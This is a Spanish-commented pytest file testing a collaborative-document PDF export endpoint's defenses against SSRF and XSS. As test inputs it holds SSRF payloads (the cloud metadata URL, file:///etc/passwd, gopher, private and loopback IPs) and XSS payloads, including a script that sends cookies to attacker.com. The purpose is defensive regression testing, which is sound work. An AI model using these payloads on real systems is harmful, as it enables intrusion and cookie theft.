"""Tests de seguridad para el endpoint V1 GET /collab/{doc_id}/export/pdf.

Valida que el endpoint de exportación de Trabajos Grupales (V1, collab_routes.py)
aplica correctamente las defensas anti-SSRF y anti-XSS implementadas en commit
192f1b6 como parte del cierre de deuda C1 de docs/pendientes.md.

Vectores probados (cierre formal de C1 hardening-c1-ssrf-v1):
- SSRF via metadata cloud AWS: http://169.254.169.254/latest/meta-data/
- SSRF via file:///etc/passwd
- SSRF via gopher://
- SSRF via javascript: en img src
- SSRF via IPs RFC1918 (192.168.x, 10.x, 172.16.x)
- SSRF via IP link-local (169.254.x)
- SSRF via localhost / 127.0.0.1
- SSRF via dominio externo no-whitelist (evil.com)
- XSS via <script>alert(1)</script>
- XSS via event handler <img onerror="alert(1)">
- XSS via event handler <a onclick="...">
- XSS via <iframe>
- data:image/png;base64 (PERMITIDO, no debe eliminarse)
- Combo: <script> + <img SSRF> en mismo HTML

Tests de no-regresion funcional (requieren xhtml2pdf):
- Contenido simple sin imagenes genera PDF valido (status 200)
- Imagen whitelisted data:base64 se preserva en el pipeline

Excepcion TDD documentada:
Este archivo NO sigue ciclo RED-GREEN-REFACTOR puro porque el comportamiento
ya existe (commit 192f1b6 implemento el fix en V1 antes de que estos tests
existieran). Los tests son una red de seguridad para detectar regresiones
futuras en el cableado del endpoint V1. Ver plan hardening-c1-ssrf-v1 §4.
"""

from __future__ import annotations

import os
import sys
from datetime import datetime, timedelta
from unittest.mock import patch

import pytest

# Asegurar que el directorio backend este en sys.path
_BACKEND_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _BACKEND_DIR not in sys.path:
    sys.path.insert(0, _BACKEND_DIR)

os.environ.pop("DATABASE_URL", None)
os.environ.setdefault("JWT_SECRET", "test-secret-do-not-use-in-production")
os.environ.setdefault("OWNER_PASSWORD", "test-owner-password")
os.environ.setdefault("CORS_ORIGINS", "http://localhost:5173")
os.environ.setdefault("BCRYPT_ROUNDS", "4")

# Skip todo el modulo si bleach no esta disponible (los 13 tests de sanitizacion lo necesitan).
pytest.importorskip("bleach", reason="bleach no instalado")
# FastAPI + httpx son necesarios para los 4 tests HTTP (funcionales + cableado).
pytest.importorskip("fastapi", reason="fastapi no instalado")
pytest.importorskip("httpx", reason="httpx no instalado")

# xhtml2pdf es solo requerida para los tests HTTP que ejercen el endpoint real.
# Los 13 tests de sanitizacion directa no la necesitan.
try:
    import xhtml2pdf  # type: ignore[import-untyped]  # noqa: F401

    _XHTML2PDF_AVAILABLE = True
except ImportError:
    _XHTML2PDF_AVAILABLE = False

_skip_no_xhtml2pdf = pytest.mark.skipif(
    not _XHTML2PDF_AVAILABLE,
    reason="xhtml2pdf no instalado — tests funcionales HTTP se ejecutan en CI",
)

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402
from sqlalchemy import create_engine  # noqa: E402
from sqlalchemy.orm import Session, sessionmaker  # noqa: E402
from sqlalchemy.pool import StaticPool  # noqa: E402


# ─── Fixtures ────────────────────────────────────────────────────────


@pytest.fixture(scope="module")
def collab_test_app():
    """Crea una FastAPI minimal con collab_router montado y BD in-memory."""
    from database import Base, get_db  # type: ignore
    from collab_routes import router as collab_router  # type: ignore

    app = FastAPI()

    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

    def override_get_db():
        db = TestingSessionLocal()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = override_get_db
    app.include_router(collab_router)

    yield app, TestingSessionLocal()


@pytest.fixture
def collab_client_and_doc(collab_test_app):
    """Retorna (client, headers, doc, db) con usuario y documento de prueba.

    Cada test que usa este fixture puede actualizar doc.content directamente
    en la BD para controlar exactamente que HTML llega al endpoint.
    """
    from jose import jwt  # type: ignore

    from database import CollabDocument, User, gen_id  # type: ignore
    from sqlalchemy import func

    app, db = collab_test_app

    # Crear usuario owner
    max_num = db.query(func.max(User.user_number)).scalar() or 0
    owner = User(
        id=gen_id(),
        email=f"collab_sec_{gen_id()}@conniku.com",
        username=f"collabsec_{gen_id()}",
        user_number=max_num + 1,
        first_name="Collab",
        last_name="Security",
        password_hash="$2b$04$test.hash.placeholder",
        birth_date="1995-05-15",
        created_at=datetime.utcnow(),
    )
    db.add(owner)
    db.commit()
    db.refresh(owner)

    # Crear documento de prueba
    doc = CollabDocument(
        id=gen_id(),
        title="Documento de Prueba Seguridad",
        content="<p>Contenido inicial</p>",
        owner_id=owner.id,
        course_name="Seguridad Informatica",
    )
    db.add(doc)
    db.commit()
    db.refresh(doc)

    # JWT de prueba
    secret = os.environ["JWT_SECRET"]
    exp = datetime.utcnow() + timedelta(hours=1)
    token = jwt.encode({"sub": owner.id, "exp": exp, "type": "access"}, secret, algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}

    with TestClient(app) as client:
        yield client, headers, doc, db


def _set_doc_content(db: Session, doc, content: str) -> None:
    """Helper: actualiza el content del documento en la BD de prueba."""
    doc.content = content
    db.add(doc)
    db.commit()
    db.refresh(doc)


# ─── Tests funcionales de no-regresion (requieren xhtml2pdf) ─────────


@_skip_no_xhtml2pdf
def test_collab_export_pdf_funciona_con_contenido_simple(
    collab_client_and_doc,
) -> None:
    """Contenido HTML simple sin imagenes genera PDF con status 200.

    Valida que el parche C1 no rompio el camino feliz del endpoint V1.
    """
    client, headers, doc, db = collab_client_and_doc
    _set_doc_content(db, doc, "<h1>Introduccion</h1><p>Contenido de prueba sin imagenes externas.</p>")

    resp = client.get(f"/collab/{doc.id}/export/pdf", headers=headers)

    assert resp.status_code == 200
    assert resp.headers.get("content-type", "").startswith("application/pdf")


@_skip_no_xhtml2pdf
def test_collab_export_pdf_con_imagen_data_base64_permitida(
    collab_client_and_doc,
) -> None:
    """data:image/png;base64,... en el documento genera PDF correctamente.

    Las imagenes ya inlineadas como data URI son seguras y NO deben ser
    eliminadas por inline_remote_images ni por sanitize_html.
    """
    client, headers, doc, db = collab_client_and_doc
    # PNG minimo valido 1x1 px en base64
    data_src = (
        "data:image/png;base64,"
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQAABjE+ibYAAAAASUVORK5CYII="
    )
    _set_doc_content(db, doc, f'<p>Con imagen</p><img src="{data_src}" alt="test">')

    resp = client.get(f"/collab/{doc.id}/export/pdf", headers=headers)

    assert resp.status_code == 200
    assert resp.headers.get("content-type", "").startswith("application/pdf")


# ─── Tests de cableado: spy sobre sanitize_html + inline_remote_images ─


@_skip_no_xhtml2pdf
def test_endpoint_invoca_sanitize_html(collab_client_and_doc) -> None:
    """El endpoint V1 llama sanitize_html con el HTML del documento.

    Verificacion de cableado: un spy confirma que la funcion se invoca.
    Si en el futuro alguien edita export_pdf y quita la llamada, este test falla.
    """
    import workspaces_export  # type: ignore

    client, headers, doc, db = collab_client_and_doc
    _set_doc_content(db, doc, "<p>Texto de prueba cableado sanitize</p>")

    with patch("collab_routes.sanitize_html", wraps=workspaces_export.sanitize_html) as mock_san:
        resp = client.get(f"/collab/{doc.id}/export/pdf", headers=headers)

    assert resp.status_code == 200
    assert mock_san.called, "sanitize_html debe ser invocado por el endpoint V1"


@_skip_no_xhtml2pdf
def test_endpoint_invoca_inline_remote_images(collab_client_and_doc) -> None:
    """El endpoint V1 llama inline_remote_images con el output de sanitize_html.

    Verificacion de cableado: un spy confirma que la funcion se invoca.
    """
    import workspaces_export  # type: ignore

    client, headers, doc, db = collab_client_and_doc
    _set_doc_content(db, doc, "<p>Texto de prueba cableado inline</p>")

    with patch(
        "collab_routes.inline_remote_images",
        wraps=workspaces_export.inline_remote_images,
    ) as mock_inline:
        resp = client.get(f"/collab/{doc.id}/export/pdf", headers=headers)

    assert resp.status_code == 200
    assert mock_inline.called, "inline_remote_images debe ser invocado por el endpoint V1"


# ─── Tests de vectores SSRF (llaman directamente a inline_remote_images) ─


def test_ssrf_aws_metadata_endpoint_bloqueado() -> None:
    """<img src="http://169.254.169.254/latest/meta-data/"> es el vector C1 original.

    inline_remote_images debe eliminar el tag completo: la URL no debe aparecer
    en el HTML que recibe xhtml2pdf.
    """
    from workspaces_export import inline_remote_images  # type: ignore

    html_con_ssrf = '<p>Texto</p><img src="http://169.254.169.254/latest/meta-data/">'
    result = inline_remote_images(html_con_ssrf)

    assert "169.254.169.254" not in result, "URL de metadata AWS no debe aparecer en HTML sanitizado"
    assert '<img src="http://169.254.169.254' not in result


def test_ssrf_file_protocol_bloqueado() -> None:
    """<img src="file:///etc/passwd"> debe ser rechazado sin leer el archivo."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="file:///etc/passwd">'
    result = inline_remote_images(html)

    assert "file://" not in result
    assert "/etc/passwd" not in result


def test_ssrf_gopher_protocol_bloqueado() -> None:
    """<img src="gopher://localhost/"> es un vector SSRF conocido."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="gopher://localhost/exploit">'
    result = inline_remote_images(html)

    assert "gopher://" not in result


def test_ssrf_javascript_en_img_src_bloqueado() -> None:
    """<img src="javascript:alert(1)"> debe ser eliminado.

    sanitize_html (via bleach) bloquea el esquema javascript: en atributos src.
    """
    from workspaces_export import sanitize_html  # type: ignore

    html = '<img src="javascript:alert(1)" alt="xss">'
    result = sanitize_html(html)

    assert "javascript:" not in result


def test_ssrf_ip_rfc1918_192_168_bloqueada() -> None:
    """IPs RFC1918 192.168.x.x no deben recibir requests."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="http://192.168.1.100/secrets">'
    result = inline_remote_images(html)

    assert "192.168.1.100" not in result


def test_ssrf_ip_rfc1918_10_x_bloqueada() -> None:
    """IPs RFC1918 10.x.x.x no deben recibir requests."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="http://10.0.0.1/internal-resource">'
    result = inline_remote_images(html)

    assert "10.0.0.1" not in result


def test_ssrf_ip_rfc1918_172_16_x_bloqueada() -> None:
    """IPs RFC1918 172.16.x.x no deben recibir requests."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="http://172.16.0.1/private">'
    result = inline_remote_images(html)

    assert "172.16.0.1" not in result


def test_ssrf_ip_link_local_169_254_bloqueada() -> None:
    """IPs link-local 169.254.x.x (incluye endpoint de metadata de cloud) bloqueadas."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="http://169.254.100.200/data">'
    result = inline_remote_images(html)

    assert "169.254.100.200" not in result


def test_ssrf_localhost_bloqueado() -> None:
    """http://localhost/ y http://127.0.0.1/ no deben ser accedidos."""
    from workspaces_export import inline_remote_images  # type: ignore

    html_localhost = '<img src="http://localhost/admin">'
    result_localhost = inline_remote_images(html_localhost)
    assert "localhost" not in result_localhost

    html_loopback = '<img src="http://127.0.0.1/secret">'
    result_loopback = inline_remote_images(html_loopback)
    assert "127.0.0.1" not in result_loopback


def test_ssrf_dominio_externo_no_whitelist_bloqueado() -> None:
    """https://evil.com/imagen.jpg no esta en la whitelist conniku.com."""
    from workspaces_export import inline_remote_images  # type: ignore

    html = '<img src="https://evil.com/x.jpg">'
    result = inline_remote_images(html)

    assert "evil.com" not in result


# ─── Tests de vectores XSS (llaman directamente a sanitize_html) ─────


def test_xss_script_tag_eliminado() -> None:
    """<script>alert(1)</script> — el tag debe ser eliminado antes del render.

    bleach con strip=True elimina el tag pero preserva el texto interior
    como texto plano (comportamiento documentado de bleach).
    """
    from workspaces_export import sanitize_html  # type: ignore

    html = "<p>Hola</p><script>alert(1)</script><p>Mundo</p>"
    result = sanitize_html(html)

    assert "<script" not in result
    assert "</script" not in result
    # El contenido legitimo se preserva
    assert "Hola" in result


def test_xss_onerror_handler_eliminado() -> None:
    """<img onerror="alert(1)"> — el handler onerror debe ser removido."""
    from workspaces_export import sanitize_html  # type: ignore

    html = '<img src="data:image/png;base64,abc" onerror="alert(1)">'
    result = sanitize_html(html)

    assert "onerror" not in result


def test_xss_onclick_handler_eliminado() -> None:
    """<a onclick="evil()"> — event handlers no deben sobrevivir."""
    from workspaces_export import sanitize_html  # type: ignore

    html = "<p><a onclick=\"document.location='https://evil.com'\">click aqui</a></p>"
    result = sanitize_html(html)

    assert "onclick" not in result


def test_xss_iframe_eliminado() -> None:
    """<iframe src="..."> no esta en la whitelist de tags permitidos."""
    from workspaces_export import sanitize_html  # type: ignore

    html = '<iframe src="https://evil.com/phishing"></iframe>'
    result = sanitize_html(html)

    assert "<iframe" not in result


# ─── Test combo: multiples vectores en el mismo HTML ─────────────────


def test_combo_script_mas_ssrf_en_mismo_documento() -> None:
    """Documento con <script> + <img SSRF> ambos deben ser eliminados.

    Valida que el pipeline completo (sanitize_html luego inline_remote_images)
    no deja pasar ninguno de los vectores cuando aparecen combinados.
    Este es el mismo orden que aplica el endpoint V1.
    """
    from workspaces_export import inline_remote_images, sanitize_html  # type: ignore

    html_malicioso = (
        "<h1>Trabajo de Investigacion</h1>"
        "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
        "<p>Introduccion</p>"
        '<img src="http://169.254.169.254/latest/meta-data/" alt="img">'
        "<p>Conclusion</p>"
    )

    # Pipeline identico al que aplica el endpoint V1
    sanitized = sanitize_html(html_malicioso)
    processed = inline_remote_images(sanitized)

    # Script eliminado
    assert "<script" not in processed
    # URL de metadata AWS eliminada
    assert "169.254.169.254" not in processed
    # Contenido legitimo preservado
    assert "Introduccion" in processed
    assert "Conclusion" in processed


# ─── Test: data:image preservada (NO eliminada) ───────────────────────


def test_data_image_base64_preservada_por_ambas_funciones() -> None:
    """data:image/png;base64,... debe sobrevivir tanto sanitize_html como inline_remote_images.

    Este es el unico tipo de imagen que siempre debe pasar el pipeline completo
    sin ser eliminada ni modificada.
    """
    from workspaces_export import inline_remote_images, sanitize_html  # type: ignore

    data_src = (
        "data:image/png;base64,"
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQAABjE+ibYAAAAASUVORK5CYII="
    )
    html = f'<p>Imagen inlineada</p><img src="{data_src}" alt="logo">'

    # Paso 1: sanitize_html no debe tocar data URIs de imagen
    after_sanitize = sanitize_html(html)
    assert "data:image/png;base64" in after_sanitize, "sanitize_html no debe eliminar data:image URIs"

    # Paso 2: inline_remote_images no debe tocar data URIs (ya inlineadas)
    after_inline = inline_remote_images(after_sanitize)
    assert data_src in after_inline, "inline_remote_images no debe modificar data:image URIs ya inlineadas"
